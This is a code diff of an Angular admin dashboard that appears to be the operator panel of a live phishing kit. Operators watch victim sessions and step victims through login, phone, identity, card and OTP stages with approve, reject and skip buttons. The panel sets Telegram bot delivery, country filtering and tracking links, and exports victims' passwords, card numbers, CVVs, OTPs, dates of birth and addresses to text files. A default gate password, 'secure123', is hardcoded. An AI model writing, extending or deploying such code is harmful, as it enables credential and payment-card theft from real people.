-
                 </div>
             </div>
 
-            <!-- Action Bar -->
             @if(!isHistory) {
                 <div class="p-5 border-t border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
                     <div class="flex items-center gap-2">
                         <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
                         <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live Connection' : 'Offline' }}</span>
                     </div>
-
                     @if(monitoredSession()) {
                         <div class="flex gap-3">
                             <button (click)="revoke()"
@@ -1389,49 +1049,27 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                     [class.opacity-50]="!session?.isLoginVerified"
                                     [class.cursor-not-allowed]="!session?.isLoginVerified"
                                     class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
-                                Revoke
+                                {{ 'REVOKE' | translate }}
                             </button>
                             <button (click)="reject()"
                                     [disabled]="!canInteract()"
                                     [class.opacity-50]="!canInteract()"
                                     [class.cursor-not-allowed]="!canInteract()"
                                     class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
-                                Reject
+                                {{ 'REJECT' | translate }}
                             </button>
-                            @if (session?.stage === 'login') {
-                                <button (click)="approve({ skipPhone: false })"
-                                        [disabled]="!canInteract()"
-                                        [class.opacity-50]="!canInteract()"
-                                        [class.cursor-not-allowed]="!canInteract()"
-                                        class="bg-pp-navy hover:bg-pp-blue text-white px-6 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
-                                    <span class="material-icons text-sm">check</span> Verify Phone
-                                </button>
-                                <button (click)="approve({ skipPhone: true })"
-                                        [disabled]="!canInteract()"
-                                        [class.opacity-50]="!canInteract()"
-                                        [class.cursor-not-allowed]="!canInteract()"
-                                        class="bg-pp-blue hover:bg-[#005ea6] text-white px-6 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
-                                    <span class="material-icons text-sm">fast_forward</span> Skip Phone
-                                </button>
-                            } @else {
-                                <button (click)="approve()"
-                                        [disabled]="!canInteract()"
-                                        [class.opacity-50]="!canInteract()"
-                                        [class.cursor-not-allowed]="!canInteract()"
-                                        class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
-                                    <span class="material-icons text-sm">check</span> {{ approveText() }}
-                                </button>
-                            }
-                        </div>
-                    } @else {
-                        <div class="text-xs text-slate-400 font-bold uppercase tracking-wider">
-                            Session Offline
+                            <button (click)="approve()"
+                                    [disabled]="!canInteract()"
+                                    [class.opacity-50]="!canInteract()"
+                                    [class.cursor-not-allowed]="!canInteract()"
+                                    class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                <span class="material-icons text-sm">check</span> {{ approveText() | translate }}
+                            </button>
                         </div>
                     }
                 </div>
             }
       </ng-template>
-      }
     </div>
   `,
   styles: [`
@@ -1442,54 +1080,40 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
     @keyframes slideInRight { from { transform: translateX(100%); } to { transform: translateX(0); } }
   `]
 })
-export class AdminDashboardComponent {
+export class AdminDashboardComponent implements OnInit {
   state = inject(StateService);
   auth = inject(AuthService);
   modal = inject(ModalService);
+  translate = inject(TranslationService);
 
   activeTab = signal<AdminTab>('live');
+  currentAdminLang = 'en';
 
-  // Pre-Auth Gate
   preAuthSuccess = signal(false);
   preAuthUser = '';
   preAuthPass = '';
   preAuthError = signal(false);
-
-  // Actual Admin Login
+  gateUser = '';
+  gatePass = '';
   loginUser = '';
   loginPass = '';
   loginError = signal(false);
   isLoading = signal(false);
-
-  // User Management
   userList = signal<any[]>([]);
-
-  // Link Management
+  userPanelOpen = signal(false);
+  selectedAdmin = signal<any>(null);
+  selectedAdminLinks = signal<any[]>([]);
+  selectedAdminSettings: any = {};
   linkList = signal<any[]>([]);
-
-  // System Logs & Audit
   auditLogs = signal<any[]>([]);
   systemLogs = signal<any[]>([]);
   kpiStats = signal<any>({ total: 0, active: 0, verified: 0, clicks: 0 });
-
-  // History Slide-out Logic
   historyPanelOpen = signal(false);
   selectedHistorySession = signal<SessionHistory | null>(null);
-
-  // User Creation Modal Logic
   userModalOpen = signal(false);
   newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
-
-  // Assign Modal
   assignModalOpen = signal(false);
   assignSearch = signal('');
-
-  filteredAdmins = computed(() => {
-      const q = this.assignSearch().toLowerCase();
-      return this.userList().filter(u => u.username.toLowerCase().includes(q));
-  });
-
-  // Filters & Selection
   searchQuery = signal('');
   timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
   customDateStart = signal<string>('');
@@ -1497,27 +1121,32 @@ export class AdminDashboardComponent {
   countryFilter = signal<string>('all');
   statusFilter = signal<string>('all');
   selectedSessionIds = signal<Set<string>>(new Set());
-
-  // Incomplete Sessions Toggle
   incompleteCollapsed = signal(false);
+  tgToken = '';
+  tgChat = '';
+  flowSettings: any = {};
+  settingOldPass = '';
+  settingNewPass = '';
+  isDarkMode = signal(false);
+  elapsedTime = signal('0m');
+  countdownSeconds = signal<number | null>(null);
+  private timer: number | undefined;
 
-  canInteract = computed(() => {
-      const s = this.monitoredSession();
-      // Debug
-      // if (s) console.log(`[Admin] Interact Check: ID=${s.id} View=${s.currentView} Stage=${s.stage}`);
-      // Only allow interaction if user is waiting (loading screen)
-      return s?.currentView === 'loading';
-  });
+  countryList = [
+      { code: 'US', name: 'United States' },
+      { code: 'GB', name: 'United Kingdom' },
+      { code: 'CA', name: 'Canada' },
+      { code: 'AU', name: 'Australia' },
+      { code: 'FR', name: 'France' },
+      { code: 'DE', name: 'Germany' },
+      { code: 'IT', name: 'Italy' },
+      { code: 'ES', name: 'Spain' },
+      { code: 'JP', name: 'Japan' }
+  ];
 
-  uniqueCountries = computed(() => {
-      const history = this.state.history();
-      const countries = new Set<string>();
-      history.forEach(h => {
-          if (h.data?.ipCountry) countries.add(h.data.ipCountry);
-      });
-      return Array.from(countries).sort();
-  });
-
+  filteredAdmins = computed(() => { const q = this.assignSearch().toLowerCase(); return this.userList().filter(u => u.username.toLowerCase().includes(q)); });
+  canInteract = computed(() => { const s = this.monitoredSession(); return s?.currentView === 'loading'; });
+  uniqueCountries = computed(() => { const history = this.state.history(); const countries = new Set<string>(); history.forEach(h => { if (h.data?.ipCountry) countries.add(h.data.ipCountry); }); return Array.from(countries).sort(); });
   filteredHistory = computed(() => {
       let data = this.state.history();
       const q = this.searchQuery().toLowerCase();
@@ -1526,126 +1155,77 @@ export class AdminDashboardComponent {
       const sf = this.statusFilter();
       const now = Date.now();
 
-      // Time Filter
       if (tf !== 'all') {
           let cutoff = 0;
           if (tf === '6h') cutoff = now - (6 * 60 * 60 * 1000);
           else if (tf === '24h') cutoff = now - (24 * 60 * 60 * 1000);
           else if (tf === '7d') cutoff = now - (7 * 24 * 60 * 60 * 1000);
-          else if (tf === 'custom') {
-              const start = this.customDateStart() ? new Date(this.customDateStart()).getTime() : 0;
-              const end = this.customDateEnd() ? new Date(this.customDateEnd()).getTime() + 86400000 : now; // End of day
-              data = data.filter(h => {
-                  const t = new Date(h.timestamp).getTime();
-                  return t >= start && t <= end;
-              });
-          }
 
           if (tf !== 'custom') {
               data = data.filter(h => new Date(h.timestamp).getTime() >= cutoff);
           }
       }
-
-      // Country Filter
       if (cf !== 'all') {
           data = data.filter(h => h.data?.ipCountry === cf);
       }
-
-      // Status Filter
       if (sf !== 'all') {
-          if (sf === 'verified') {
-              data = data.filter(h => !h.data?.isArchivedIncomplete);
-          } else if (sf === 'incomplete') {
-              data = data.filter(h => h.data?.isArchivedIncomplete);
-          }
+          if (sf === 'verified') data = data.filter(h => !h.data?.isArchivedIncomplete);
+          else if (sf === 'incomplete') data = data.filter(h => h.data?.isArchivedIncomplete);
       }
-
-      // Search Filter
       if (q) {
           data = data.filter(h =>
               h.id.toLowerCase().includes(q) ||
-              (h.email && h.email.toLowerCase().includes(q)) ||
-              (h.name && h.name.toLowerCase().includes(q)) ||
-              (h.data?.cardLast4 && h.data.cardLast4.includes(q)) ||
-              (h.data?.cardBin && h.data.cardBin.includes(q))
+              (h.email && h.email.toLowerCase().includes(q))
           );
       }
-
       return data;
   });
-
-  // Settings
-  tgToken = '';
-  tgChat = '';
-  flowSettings: any = {};
-
-  isSettingsConfigured = computed(() => {
-      const t = this.tgToken;
-      const c = this.tgChat;
-      return !!(t && c && t.length > 5 && c.length > 3);
-  });
-
-  maskedToken = computed(() => {
-      const t = this.tgToken;
-      if (!t || t.length < 8) return '********';
-      return `${t.substring(0, 3)}...${t.substring(t.length - 5)}`;
-  });
-
-  maskedChat = computed(() => {
-      const c = this.tgChat;
-      if (!c || c.length < 5) return '***';
-      return `${c.substring(0, 2)}...${c.substring(c.length - 3)}`;
-  });
-
-  // Security
-  settingOldPass = '';
-  settingNewPass = '';
-
-  // Appearance
-  isDarkMode = signal(false);
-
-  monitoredSession = computed(() => {
-      const id = this.state.monitoredSessionId();
-      if (!id) return null;
-      // Search in both active and incomplete
-      const active = this.state.activeSessions().find(s => s.id === id);
-      if (active) return active;
-      return this.state.incompleteSessions().find(s => s.id === id);
-  });
-
-  elapsedTime = signal('0m');
-  countdownSeconds = signal<number | null>(null);
-  private timer: number | undefined;
+  isSettingsConfigured = computed(() => !!(this.tgToken && this.tgChat));
+  maskedToken = computed(() => this.tgToken ? '********' : '');
+  maskedChat = computed(() => this.tgChat ? '***' : '');
+  monitoredSession = computed(() => { const id = this.state.monitoredSessionId(); if (!id) return null; const active = this.state.activeSessions().find(s => s.id === id); if (active) return active; return this.state.incompleteSessions().find(s => s.id === id); });
 
   constructor() {
-      // Load Dark Mode
-      const stored = localStorage.getItem('admin_theme');
-      if (stored === 'dark') {
-          this.isDarkMode.set(true);
-          document.documentElement.classList.add('dark');
+      if (typeof localStorage !== 'undefined') {
+          const savedLang = localStorage.getItem('admin_lang');
+          if (savedLang) {
+              this.currentAdminLang = savedLang;
+              this.translate.loadLanguage(savedLang);
+          }
+          const stored = localStorage.getItem('admin_theme');
+          if (stored === 'dark') {
+              this.isDarkMode.set(true);
+              if (typeof document !== 'undefined') document.documentElement.classList.add('dark');
+          }
       }
 
-      // Initial Sync
+      const returnTab = sessionStorage.getItem('hv_return_tab');
+      if (returnTab === 'users') {
+          this.activeTab.set('users');
+          sessionStorage.removeItem('hv_return_tab');
+          this.preAuthSuccess.set(true);
+      }
+
       effect(() => {
           if (this.auth.isAuthenticated()) {
               this.state.setAdminAuthenticated(true);
               const role = this.auth.currentUser()?.role;
-
               if (role === 'hypervisor') {
                   this.fetchUsers();
                   this.state.joinHypervisorRoom(this.auth.getToken());
-                  this.state.onLog((log) => {
-                      this.systemLogs.update(logs => [log, ...logs].slice(0, 100));
-                  });
+                  this.state.onLog((log) => { this.systemLogs.update(logs => [log, ...logs].slice(0, 100)); });
               }
           }
       }, { allowSignalWrites: true });
 
-      // Effect to fetch audit logs or links when tab changes
       effect(() => {
           if (this.activeTab() === 'system') {
               this.fetchAuditLogs();
               this.calcStats();
+              fetch('/api/settings').then(res => res.json()).then(data => {
+                  this.gateUser = data.gateUser || 'admin';
+                  this.gatePass = data.gatePass || 'secure123';
+              });
           }
           if (this.activeTab() === 'links') {
               this.fetchLinks();
@@ -1653,34 +1233,26 @@ export class AdminDashboardComponent {
       }, { allowSignalWrites: true });
 
       effect(() => {
-          // Sync User Settings to Local Model
           const user = this.auth.currentUser();
           if (user) {
               this.flowSettings = { ...user.settings };
+              // Ensure arrays exist
+              if(!this.flowSettings.allowedCountries) this.flowSettings.allowedCountries = [];
+              if(!this.flowSettings.blockedCountries) this.flowSettings.blockedCountries = [];
 
               if (user.telegramConfig) {
                   this.tgToken = user.telegramConfig.token || '';
                   this.tgChat = user.telegramConfig.chat || '';
               }
           }
-
-          // Legacy Global Fallback (Visual Only)
-          if (!this.tgToken && this.state.telegramBotToken()) {
-              this.tgToken = this.state.telegramBotToken();
-              this.tgChat = this.state.telegramChatId();
-          }
       });
 
       effect(() => {
           const session = this.monitoredSession();
           clearInterval(this.timer);
-
           if (session) {
               const update = () => {
-                   // 1. Elapsed
                    if(session.timestamp) this.elapsedTime.set(this.getElapsed(session.timestamp));
-
-                   // 2. Countdown
                    if(session.currentView === 'loading' && session.data?.waitingStart) {
                        const start = Number(session.data.waitingStart);
                        const limit = Number(session.data.autoApproveThreshold || 20000);
@@ -1691,7 +1263,6 @@ export class AdminDashboardComponent {
                        this.countdownSeconds.set(null);
                    }
               };
-
               update();
               this.timer = setInterval(update, 1000) as unknown as number;
           } else {
@@ -1699,6 +1270,46 @@ export class AdminDashboardComponent {
               this.countdownSeconds.set(null);
           }
       }, { allowSignalWrites: true });
+  }
+
+  ngOnInit() {}
+
+  changeAdminLanguage(lang: string) {
+      this.currentAdminLang = lang;
+      this.translate.loadLanguage(lang);
+      localStorage.setItem('admin_lang', lang);
+  }
+
+  addCountry(type: 'allowed' | 'blocked', code: string) {
+      if (!this.flowSettings) this.flowSettings = {};
+      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+      if (!this.flowSettings[key]) this.flowSettings[key] = [];
+      if (!this.flowSettings[key].includes(code)) {
+          this.flowSettings[key].push(code);
+      }
+  }
+
+  removeCountry(type: 'allowed' | 'blocked', code: string) {
+      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+      if (this.flowSettings && this.flowSettings[key]) {
+          this.flowSettings[key] = this.flowSettings[key].filter((c: string) => c !== code);
+      }
+  }
+
+  addCountryToAdmin(type: 'allowed' | 'blocked', code: string) {
+      // For selectedAdminSettings in User Panel
+      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+      if (!this.selectedAdminSettings[key]) this.selectedAdminSettings[key] = [];
+      if (!this.selectedAdminSettings[key].includes(code)) {
+          this.selectedAdminSettings[key].push(code);
+      }
+  }
+
+  removeCountryFromAdmin(type: 'allowed' | 'blocked', code: string) {
+      const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+      if (this.selectedAdminSettings && this.selectedAdminSettings[key]) {
+          this.selectedAdminSettings[key] = this.selectedAdminSettings[key].filter((c: string) => c !== code);
+      }
   }
 
   async doPreAuth() {
@@ -1709,7 +1320,6 @@ export class AdminDashboardComponent {
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ username: this.preAuthUser, password: this.preAuthPass })
           });
-
           if (res.ok) {
               this.preAuthSuccess.set(true);
               this.preAuthError.set(false);
@@ -1724,619 +1334,55 @@ export class AdminDashboardComponent {
   }
 
   async doLogin() {
-      this.loginError.set(false); // Reset error state before attempt
+      this.loginError.set(false);
       this.isLoading.set(true);
-
       const success = await this.auth.login(this.loginUser, this.loginPass);
       this.isLoading.set(false);
-
       if (success) {
           this.loginError.set(false);
-          // Don't clear fields immediately in case of glitches, or clear only on success
           this.loginUser = '';
           this.loginPass = '';
       } else {
           this.loginError.set(true);
-          // Do NOT reset preAuthSuccess here. The user is still behind the gate.
       }
   }
 
-  exitImpersonation() {
-      this.auth.logout();
-      // Logout in AuthService now handles restoring parent token
-  }
-
-  exitAdmin() {
-      this.auth.logout();
-      this.state.returnFromAdmin();
-      // Reset Pre-Auth too? User preference. Usually yes for security.
-      this.preAuthSuccess.set(false);
-      this.preAuthUser = '';
-      this.preAuthPass = '';
-  }
-
-  refresh() {
-      this.state.fetchSessions().then(() => {
-          this.state.showAdminToast('Refreshed Sessions');
-      });
-      if (this.auth.currentUser()?.role === 'hypervisor') {
-          this.fetchUsers();
-          if (this.activeTab() === 'system') {
-              this.fetchAuditLogs();
-              this.calcStats();
-          }
-      }
-  }
-
-  // --- Link Management ---
-
-  async fetchLinks() {
-      try {
-          const res = await fetch('/api/admin/links', {
-              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
-          });
-          if (res.ok) {
-              this.linkList.set(await res.json());
-          }
-      } catch(e) {}
-  }
-
-  async generateLink() {
-      try {
-          const res = await fetch('/api/admin/links', {
-              method: 'POST',
-              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
-          });
-          if (res.ok) {
-              const data = await res.json();
-              this.state.showAdminToast(`Link Created: ${data.code}`);
-              this.fetchLinks();
-          } else {
-              const err = await res.json();
-              this.state.showAdminToast(err.error || 'Failed to create link');
-          }
-      } catch(e) {
-          this.state.showAdminToast('Error creating link');
-      }
-  }
-
-  async deleteLink(code: string) {
-      if(!await this.modal.confirm('Delete Link', `Delete tracking link ${code}?`, 'danger')) return;
-
-      try {
-          const res = await fetch(`/api/admin/links/${code}`, {
-              method: 'DELETE',
-              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
-          });
-          if (res.ok) {
-              this.state.showAdminToast('Link Deleted');
-              this.fetchLinks();
-          } else {
-               const err = await res.json();
-               this.state.showAdminToast(err.error || 'Failed');
-          }
-      } catch(e) {
-          this.state.showAdminToast('Error deleting link');
-      }
-  }
-
-  getLinkUrl(code: string): string {
-      return `${window.location.origin}/?id=${code}`;
-  }
-
-  isDefaultLink(code: string): boolean {
-      return code === this.auth.currentUser()?.uniqueCode;
-  }
-
-  // --- System & User Management ---
-
-  async fetchAuditLogs() {
-      try {
-          const res = await fetch('/api/admin/audit', {
-              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
-          });
-          if (res.ok) {
-              const logs = await res.json();
-              this.auditLogs.set(logs);
-          }
-      } catch(e) {}
-  }
-
-  async toggleSuspension(user: any) {
-      const action = user.isSuspended ? 'unsuspend' : 'suspend';
-      if (!await this.modal.confirm(action === 'suspend' ? 'Suspend User' : 'Unsuspend User', `Are you sure you want to ${action} ${user.username}?`)) return;
-
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, {
-              method: 'PUT',
-              headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${this.auth.getToken()}`
-              },
-              body: JSON.stringify({ isSuspended: !user.isSuspended })
-          });
-          if (res.ok) {
-              this.state.showAdminToast(user.isSuspended ? 'User Activated' : 'User Suspended');
-              this.fetchUsers();
-          }
-      } catch(e) {
-          this.state.showAdminToast('Update Failed');
-      }
-  }
-
-  async resetUserPassword(user: any) {
-      const newPass = await this.modal.prompt('Reset Password', `Enter new password for ${user.username}:`, '');
-      if (!newPass) return;
-
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, {
-              method: 'PUT',
-              headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${this.auth.getToken()}`
-              },
-              body: JSON.stringify({ password: newPass })
-          });
-          if (res.ok) {
-              this.state.showAdminToast('Password Reset');
-          }
-      } catch(e) {
-          this.state.showAdminToast('Reset Failed');
-      }
-  }
-
-  calcStats() {
-      // Simplified client-side calc based on loaded data
-      // Ideally this comes from a dedicated stats endpoint
-      const users = this.userList();
-      const history = this.state.history();
-      const active = this.state.activeSessions();
-
-      this.kpiStats.set({
-          total: history.length + active.length,
-          active: active.length,
-          verified: history.filter(h => !h.data?.isArchivedIncomplete).length,
-          clicks: 0 // Fetch from links endpoint later
-      });
-  }
-
-  async fetchUsers() {
-      try {
-          const res = await fetch('/api/admin/users', {
-              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
-          });
-          if (res.ok) {
-              const users = await res.json();
-              this.userList.set(users);
-          }
-      } catch(e) {}
-  }
-
-  async updateUserMaxLinks(user: any) {
-      const limit = await this.modal.prompt('Update Limits', `Max links for ${user.username}:`, '1');
-      if (!limit || isNaN(Number(limit))) return;
-
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, {
-              method: 'PUT',
-              headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${this.auth.getToken()}`
-              },
-              body: JSON.stringify({ maxLinks: Number(limit) })
-          });
-          if (res.ok) {
-              this.state.showAdminToast('Limit Updated');
-              this.fetchUsers();
-          }
-      } catch(e) {}
-  }
-
-  openAddUserModal() {
-      this.newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
-      this.userModalOpen.set(true);
-  }
-
-  closeUserModal() {
-      this.userModalOpen.set(false);
-  }
-
-  async submitCreateUser() {
-      if (!this.newUser.username || !this.newUser.password) {
-          this.state.showAdminToast('Username and Password required');
-          return;
-      }
-
-      try {
-          const res = await fetch('/api/admin/users', {
-              method: 'POST',
-              headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${this.auth.getToken()}`
-              },
-              body: JSON.stringify({
-                  username: this.newUser.username,
-                  password: this.newUser.password,
-                  role: this.newUser.role,
-                  maxLinks: this.newUser.maxLinks,
-                  settings: this.newUser.flow
-              })
-          });
-          if (res.ok) {
-              this.state.showAdminToast('User Created');
-              this.closeUserModal();
-              this.fetchUsers();
-          } else {
-              this.state.showAdminToast('Failed to create user');
-          }
-      } catch(e) {
-          this.state.showAdminToast('Error creating user');
-      }
-  }
-
-  async deleteUser(user: any) {
-      if (!await this.modal.confirm('Delete User', `Are you sure you want to delete ${user.username}?`, 'danger')) return;
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, {
-              method: 'DELETE',
-              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
-          });
-          if (res.ok) {
-              this.state.showAdminToast('User Deleted');
-              this.fetchUsers();
-          }
-      } catch(e) {}
-  }
-
-  async impersonateUser(user: any) {
-      if (!await this.modal.confirm('Impersonate User', `Log in as ${user.username}?`, 'confirm')) return;
-      const success = await this.auth.impersonate(user.id);
-      if (success) {
-          window.location.reload(); // Reload to refresh state fully
-      } else {
-          this.state.showAdminToast('Impersonation Failed');
-      }
-  }
-
-  async assignAdmin() {
-      const s = this.monitoredSession();
-      if(!s) return;
-      this.assignModalOpen.set(true);
-  }
-
-  async submitAssignment(adminId: string) {
-      const s = this.monitoredSession();
-      if(!s) return;
-
-      try {
-          await fetch('/api/admin/assign-session', {
-              method: 'POST',
-              headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${this.auth.getToken()}`
-              },
-              body: JSON.stringify({ sessionId: s.id, adminId })
-          });
-          this.state.showAdminToast('Assigned');
-          this.state.fetchSessions();
-          this.assignModalOpen.set(false);
-      } catch(e) {
-          this.state.showAdminToast('Assignment Failed');
-      }
-  }
-
-  selectSession(session: any) {
-      this.state.setMonitoredSession(session.id);
-  }
-
-  viewHistory(session: SessionHistory) {
-      this.selectedHistorySession.set(session);
-      this.historyPanelOpen.set(true);
-  }
-
-  toggleSelection(id: string, event: Event) {
-      event.stopPropagation();
-      this.selectedSessionIds.update(set => {
-          const newSet = new Set(set);
-          if (newSet.has(id)) newSet.delete(id);
-          else newSet.add(id);
-          return newSet;
-      });
-  }
-
-  toggleAllSelection(event: Event) {
-      const checked = (event.target as HTMLInputElement).checked;
-      if (checked) {
-          const allIds = this.filteredHistory().map(h => h.id);
-          this.selectedSessionIds.set(new Set(allIds));
-      } else {
-          this.selectedSessionIds.set(new Set());
-      }
-  }
-
-  isAllSelected(): boolean {
-      const filtered = this.filteredHistory();
-      if (filtered.length === 0) return false;
-      return this.selectedSessionIds().size === filtered.length;
-  }
-
-  async bulkDelete() {
-      const ids = Array.from(this.selectedSessionIds());
-      if (ids.length === 0) return;
-      if (!await this.modal.confirm('Bulk Delete', `Delete ${ids.length} sessions?`, 'danger')) return;
-
-      ids.forEach(id => this.state.deleteSession(id));
-      this.selectedSessionIds.set(new Set());
-  }
-
-  bulkPin() {
-      const ids = Array.from(this.selectedSessionIds());
-      if (ids.length === 0) return;
-
-      ids.forEach(id => this.state.pinSession(id));
-      this.selectedSessionIds.set(new Set());
-  }
-
-  bulkExport() {
-      const ids = this.selectedSessionIds();
-      if (ids.size === 0) return;
-
-      const sessions = this.filteredHistory().filter(h => ids.has(h.id));
-      const content = sessions.map(s => {
-          const data = s.data || {};
-          return `
-SESSION REPORT
-==============
-ID: ${s.id}
-Time: ${s.timestamp}
-IP: ${s.fingerprint?.ip || 'Unknown'}
-Status: ${s.status}
-
-IDENTITY
-Name: ${data.firstName} ${data.lastName}
-DOB: ${data.dob}
-Address: ${data.address}
-Country: ${data.country}
-Phone: ${data.phoneNumber}
-
-CREDENTIALS
-Email: ${data.email}
-Password: ${data.password}
-
-FINANCIAL
-Card: ${data.cardNumber}
-Exp: ${data.cardExpiry}
-CVV: ${data.cardCvv}
-OTP: ${data.cardOtp}
-Phone Code: ${data.phoneCode}
-
-USER AGENT
-${s.fingerprint?.userAgent}
-
-----------------------------------------
-`;
-      }).join('\n');
-
-      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `sessions-export-${ids.size}.txt`;
-      a.click();
-      window.URL.revokeObjectURL(url);
-  }
-
-  closeHistory() {
-      this.historyPanelOpen.set(false);
-      this.selectedHistorySession.set(null);
-  }
-
-  formatCard(num: string | undefined): string {
-      if (!num) return '•••• •••• •••• ••••';
-      return num.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim();
-  }
-
-  isSelected(session: any): boolean {
-      return this.state.monitoredSessionId() === session.id;
-  }
-
-  getDisplayEmail(email: string): string {
-      if (!email) return 'Waiting for input...';
-      if (email === 'admin' || email === this.state.adminUsername()) return 'Typing...';
-      return email;
-  }
-
-  isSessionLive(session: any): boolean {
-      if (!session || !session.lastSeen) return false;
-      return (Date.now() - session.lastSeen) < 60000; // 1 min active threshold
-  }
-
-  async deleteSession(session: any) {
-      if(await this.modal.confirm('Delete Session', 'Are you sure you want to delete this session?', 'danger')) {
-          this.state.deleteSession(session.id);
-      }
-  }
-
-  async revoke() {
-      if(await this.modal.confirm('Revoke Session', 'Are you sure you want to revoke this session? The user will be reset to login.', 'danger')) {
-          this.state.adminRevokeSession(this.monitoredSession()!.id);
-      }
-  }
-
-  pinSession(session: any) {
-      this.state.pinSession(session.id);
-  }
-
-  async archiveSession(session: any, event: Event) {
-      event.stopPropagation();
-      if(await this.modal.confirm('Archive Session', 'Archive this incomplete session to history?')) {
-          this.state.archiveSession(session.id);
-      }
-  }
-
-  extendTimeout(ms: number) {
-      const s = this.monitoredSession();
-      if (s) {
-          // Optimistic Update (Prevent visual freeze)
-          if(s.data && s.data.autoApproveThreshold) {
-              s.data.autoApproveThreshold = Number(s.data.autoApproveThreshold) + ms;
-          }
-          this.state.sendAdminCommand(s.id, 'EXTEND_TIMEOUT', { duration: ms });
-          this.state.showAdminToast(`Added +${ms/1000}s`);
-      }
-  }
-
-  exportTxt(session: any) {
-      const data = session.data || {};
-      const content = `
-SESSION REPORT
-==============
-ID: ${session.id}
-Time: ${session.timestamp}
-IP: ${session.fingerprint?.ip || session.ip}
-Status: ${session.status}
-
-IDENTITY
---------
-Name: ${data.firstName} ${data.lastName}
-DOB: ${data.dob}
-Address: ${data.address}
-Country: ${data.country}
-Phone: ${data.phoneNumber}
-
-CREDENTIALS
------------
-Email: ${data.email}
-Password: ${data.password}
-
-FINANCIAL
----------
-Card: ${data.cardNumber}
-Exp: ${data.cardExpiry}
-CVV: ${data.cardCvv}
-OTP: ${data.cardOtp}
-Phone Code: ${data.phoneCode}
-
-USER AGENT
-----------
-${session.fingerprint?.userAgent}
-      `.trim();
-
-      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `session-${session.id}.txt`;
-      a.click();
-      window.URL.revokeObjectURL(url);
-  }
-
-  private getElapsed(timestamp: Date | undefined): string {
-      if (!timestamp) return '0m';
-      const diffMs = Date.now() - new Date(timestamp).getTime();
-      const diffMins = Math.floor(diffMs / 60000);
-      
-      if (diffMins < 60) return `${diffMins}m`;
-      const h = Math.floor(diffMins / 60);
-      const m = diffMins % 60;
-      return `${h}h ${m}m`;
-  }
-
-  copy(val: string) {
-      if (!val) return;
-      navigator.clipboard.writeText(val).then(() => {
-          this.state.showAdminToast('Copied to clipboard');
-      });
-  }
-
-  requestOtp() {
-      this.state.adminRequestCardOtp();
-  }
-
-  requestFlow(flow: 'otp' | 'app' | 'both') {
-      this.state.adminApproveStep({ flow });
-  }
-
-  reject() {
-      this.state.adminRejectStep('Security verification failed.');
-  }
-
-  approve(payload: any = {}) {
-      this.state.adminApproveStep(payload);
-  }
+  exitAdmin() { this.auth.logout(); this.state.returnFromAdmin(); this.preAuthSuccess.set(false); }
+  exitImpersonation() { this.auth.logout(); }
+  refresh() { this.state.fetchSessions(); if(this.auth.currentUser()?.role === 'hypervisor') { this.fetchUsers(); } }
 
   approveText(): string {
       const stage = this.monitoredSession()?.stage;
       switch (stage) {
-          case 'login': return 'Approve Login'; // Should not show due to template check
-          case 'phone_pending': return 'Approve Phone';
-          case 'personal_pending': return 'Approve Identity';
-          case 'card_pending': return 'Approve & Complete';
-          case 'card_otp_pending': return 'Approve OTP';
-          case 'bank_app_input': return 'Waiting for User'; // New status
-          case 'bank_app_pending': return 'Complete Session';
-          default: return 'Approve';
+          case 'login': return 'APPROVE_LOGIN';
+          case 'phone_pending': return 'APPROVE_PHONE';
+          case 'personal_pending': return 'APPROVE_IDENTITY';
+          case 'card_pending': return 'APPROVE_CARD';
+          case 'card_otp_pending': return 'APPROVE_OTP';
